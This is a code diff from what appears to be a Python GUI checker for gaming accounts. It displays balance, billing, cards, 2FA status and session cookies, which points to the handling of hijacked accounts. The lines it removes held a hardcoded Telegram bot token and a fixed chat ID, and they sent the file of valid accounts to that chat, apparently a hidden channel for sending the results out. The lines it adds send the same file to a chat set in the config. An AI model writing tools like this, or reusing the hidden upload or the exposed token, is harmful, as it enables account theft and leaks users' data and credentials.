@@ -279,9 +279,7 @@ def menu_settings(event):
 
     load_settings()
 
-def telegram_send(text):
-    bot = telebot.TeleBot('7481512087:AAHx5_nF2piroo5rYoXxAjEsIYGniR1evSQ')
-    bot.send_document(6120299778, open(r"Results/Valid.txt", 'rb'), caption=text)
+
 
 try:
     config = open('config.json', 'r', encoding='utf-8')
@@ -292,6 +290,9 @@ except:
     config = {'Sorting': {'Balance': '100,1000,10000', 'Donate': '1, 1000, 50000', 'Rap': '', 'Premium': 'True'},
               'Badges | Gamepasses': {'Badges': '', 'Gamepasses': ''}, 'Other': {'Picture': 'True', 'Proxy': 'False'}}
 
+def telegram_send(text):
+    bot = telebot.TeleBot(str(config['Telegram']['Token']))
+    bot.send_document(int(config['Telegram']['Chat_ID']), open(r"Results/Valid.txt", 'rb'), caption=text)
 
 def add_user_to_inner_frame(username, balance, donate, rap, billing, src, premium, cards, bd, gp, pending, mail, creation_date, two_fa, krb_hd, cookie):
     block_frame = tk.Frame(inner_frame, bg="#545454", borderwidth=1, relief=tk.RAISED, width=370, height=100)
